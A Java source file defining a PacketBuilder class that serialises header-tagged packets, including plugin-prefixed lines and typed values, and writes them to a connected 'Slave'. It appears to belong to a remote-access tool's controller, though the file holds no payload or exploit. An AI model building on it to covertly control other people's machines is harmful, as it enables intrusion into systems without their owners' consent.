package com.redpois0n.packets;

import java.util.ArrayList;
import java.util.List;

import com.redpois0n.Slave;
import com.redpois0n.common.exceptions.PacketAlreadySentException;
import com.redpois0n.plugins.PluginEventHandler;

public class PacketBuilder {

	private final String header;
	private List<Object> list;
	private boolean sent;
	private boolean plugin;

	public PacketBuilder(Header header) {
		this.header = header.getHeader();
	}

	public PacketBuilder(Header header, Object extra) {
		this(header.getHeader(), new Object[] { extra });
	}

	public PacketBuilder(Header header, Object[] extra) {
		this(header.getHeader(), extra);
	}

	public PacketBuilder(String header, Object extra) {
		this(header, new Object[] { extra });
	}

	public PacketBuilder(String header, Object[] extra) {
		String h = header;
		for (Object obj : extra) {
			add(obj);
		}

		this.header = h;
	}

	public void add(Object obj) {
		if (list == null) {
			list = new ArrayList<Object>();
		}

		list.add(obj);
	}

	public String getHeader() {
		return header;
	}

	public synchronized void write(Slave slave) {
		try {

			if (sent) {
				throw new PacketAlreadySentException();
			}

			if (isPluginPacket()) {
				slave.writeLine("-c " + header);
			} else {
				slave.writeLine(header);
			}
			
			PluginEventHandler.onSendPacket(header, slave);

			for (int i = 0; list != null && i < list.size(); i++) {
				Object obj = list.get(i);

				if (isPluginPacket()) {
					if (obj instanceof byte[]) {
						slave.getDataOutputStream().write((byte[]) obj);
					} else {
						slave.writeLine("-c " + obj);
					}
				} else {
					if (obj instanceof byte[]) {
						slave.getDataOutputStream().write((byte[]) obj);
					} else if (obj instanceof Integer) {
						slave.writeInt((Integer) obj);
					} else if (obj instanceof Long) {
						slave.writeLong((Long) obj);
					} else if (obj instanceof Boolean) {
						slave.writeBoolean((Boolean) obj);
					} else {
						slave.writeLine(obj);
					}
				}
			}

			sent = true;

			if (list != null) {
				list.clear();
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public boolean isPluginPacket() {
		return plugin;
	}

	public void setPluginPacket(boolean plugin) {
		this.plugin = plugin;
	}
}
